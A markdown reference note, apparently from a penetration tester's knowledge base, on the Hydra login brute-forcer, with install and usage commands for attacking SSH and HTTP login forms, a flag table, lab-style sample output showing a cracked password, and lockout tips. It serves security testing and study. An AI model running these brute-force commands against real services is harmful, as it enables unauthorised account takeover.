---
tags:
  - tool
category: exploitation
---

# Hydra

## Description

An online (network-facing) login brute-forcer supporting dozens of protocols (SSH, FTP, HTTP forms, SMB, RDP, and more) - used to attack authentication directly against a running service, as opposed to offline hash cracking.

## Installation

```bash
sudo apt install hydra
```

## Common Usage

*Crack a password for a username on different services*
```bash
hydra -v -l <username> -P <path_to_wordlist> <target> <service>
```

*Try a list of usernames against a list of passwords*
```bash
hydra -L <userlist> -P <passlist> <target> <service>
```

*Brute force an HTTP POST login form*
```bash
hydra -l <username> -P <path_to_wordlist> <target> http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
```

## Flags Reference

| Flag | Description |
|---|---|
| `-l <user>` | Single username |
| `-L <file>` | Username list |
| `-p <pass>` | Single password |
| `-P <file>` | Password wordlist |
| `-v` / `-V` | Verbose / show each attempt |
| `-t <n>` | Number of parallel tasks (threads) |
| `-s <port>` | Non-default port |
| `-f` | Stop after first valid password found |

## Example Output

```
$ hydra -v -l admin -P rockyou.txt 10.10.10.10 ssh
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
[ATTEMPT] target 10.10.10.10 - login "admin" - pass "123456" - 1 of 14344399
...
[22][ssh] host: 10.10.10.10   login: admin   password: s3rvice
1 of 1 target successfully completed, 1 valid password found
```

## Notes / Gotchas

- Account lockout policies can lock out the real account (or trigger alerting) well before the wordlist finishes - throttle with `-t` and check the target's lockout threshold before going wide on a real engagement.
- For HTTP form brute forcing, getting the failure-string match exactly right (the text after the last `:`) is the most common reason Hydra silently reports every attempt as valid or invalid incorrectly - verify manually first.

## Related

- [Login Brute Forcing](../HTB/Cheatsheets/Login%20Brute%20Forcing.md)
- [Crunch](Crunch.md) - for generating targeted wordlists to feed Hydra
- [Password Attacks](../HTB/Cheatsheets/Password%20Attacks.md)
